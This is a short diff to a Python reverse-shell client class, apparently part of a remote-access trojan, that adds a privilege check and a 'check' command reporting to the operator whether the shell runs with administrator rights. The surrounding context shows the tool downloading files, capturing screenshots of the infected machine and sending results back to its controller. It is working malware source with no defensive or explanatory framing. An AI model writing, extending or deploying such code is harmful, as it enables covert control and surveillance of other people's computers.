@@ -42,6 +42,15 @@ class Reverse_Shell:
         with open(file_name, "wb") as out_file:
             out_file.write(get_reponse.content)
 
+    def has_admin(self):
+        global admin
+        try:
+            temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\\windows'),'temp']))
+        except:
+            admin = False
+        else:
+            admin = True
+
     def screenshot(self):
         with mss() as screenshot:
             screenshot.shot()
@@ -97,6 +106,12 @@ class Reverse_Shell:
                     os.remove("monitor-1.png")
                 except:
                     self.reliable_send("[-] Failed to take screenshot")
+            elif command[:5] == "check":
+                self.has_admin()
+                if admin:
+                    self.reliable_send("Administrator privileges")
+                else:
+                    self.reliable_send("User privileges")
             else:
                 try:
                     # creation of the command, see documentation
